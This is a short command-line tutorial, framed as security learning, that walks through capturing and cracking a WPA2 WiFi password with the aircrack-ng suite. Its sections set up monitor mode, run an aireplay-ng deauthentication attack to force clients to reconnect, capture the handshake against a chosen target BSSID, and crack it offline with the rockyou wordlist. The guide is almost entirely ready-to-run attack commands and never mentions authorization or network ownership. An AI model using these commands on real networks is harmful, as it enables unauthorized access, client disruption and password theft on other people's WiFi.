==================================================
🛡️  WiFi Security Learning
==================================================
A simple step-by-step guide to understand how WPA2
WiFi handshake capture and auditing works.
--------------------------------------------------
0. PREREQUISITES
--------------------------------------------------
Before starting, make sure the following are true:
- Best supported on Linux, especially Kali Linux or Ubuntu.
- Most steps in this guide will NOT work properly on
  Windows or macOS in the same way.
- Your WiFi adapter must support Monitor Mode.
- Some adapters may also need Packet Injection support.
- You need sudo/root access on your machine.
- NetworkManager may interfere, so it may need to be
  stopped temporarily during testing.

Recommended environment:
- OS: Linux
- Tool support: aircrack-ng suite installed
- Hardware: external or internal WiFi adapter that
  supports monitor mode

To check your OS:
`uname -a`

To check your WiFi interface:
`iw dev`
--------------------------------------------------
1. SCAN AVAILABLE NETWORKS
--------------------------------------------------
Scan available WiFi networks:
`nmcli device wifi list`

Note down:
- **BSSID** (example: B6:A0:A0:XX:XX:XX)
- **CHAN** (example: 6)
--------------------------------------------------
2. INSTALL REQUIRED TOOLS
--------------------------------------------------
Install Aircrack-ng:
`sudo apt update`
`sudo apt install aircrack-ng -y`

Download wordlist:
`curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt`
--------------------------------------------------
3. ENABLE MONITOR MODE
--------------------------------------------------
Check your WiFi interface:
`iw dev`

Example interface:
**wlp4s0**

Kill interfering processes:
`sudo airmon-ng check kill`

Enable monitor mode:
`sudo airmon-ng start wlp4s0`

New interface will be:
**wlp4s0mon**
--------------------------------------------------
4. CAPTURE THE HANDSHAKE
--------------------------------------------------
Start capture (Terminal 1):
`sudo airodump-ng -c <CHANNEL> --bssid <TARGET_MAC> -w capture_file <MON_IFACE>`

Example:
`sudo airodump-ng -c 6 --bssid B6:A0:A0:XX:XX:XX -w capture_file wlp4s0mon`

Force reconnect (Terminal 2):
`sudo aireplay-ng -0 5 -a <TARGET_MAC> <MON_IFACE>`

Wait for this message in Terminal 1:
**WPA handshake: <TARGET_MAC>**

Then press:
**CTRL + C**
--------------------------------------------------
5. CRACK THE PASSWORD (OFFLINE)
--------------------------------------------------
Run:
`aircrack-ng -b <TARGET_MAC> -w rockyou.txt capture_file-01.cap`
--------------------------------------------------
6. CLEANUP (RESTORE NORMAL MODE)
--------------------------------------------------
Stop monitor mode:
`sudo airmon-ng stop <MON_IFACE>`

Restart network manager:
`sudo systemctl start NetworkManager`
--------------------------------------------------
📌 QUICK REFERENCE
--------------------------------------------------
**<TARGET_MAC>** → Router MAC address (BSSID)
**<CHANNEL>** → WiFi channel number
**<IFACE>** → Your WiFi adapter (e.g., wlp4s0)
**<MON_IFACE>** → Monitor interface (e.g., wlp4s0mon)
--------------------------------------------------
✅ SUMMARY
--------------------------------------------------
1. Check prerequisites
2. Scan networks
3. Install tools
4. Enable monitor mode
5. Capture handshake
6. Crack password
7. Restore system
==================================================
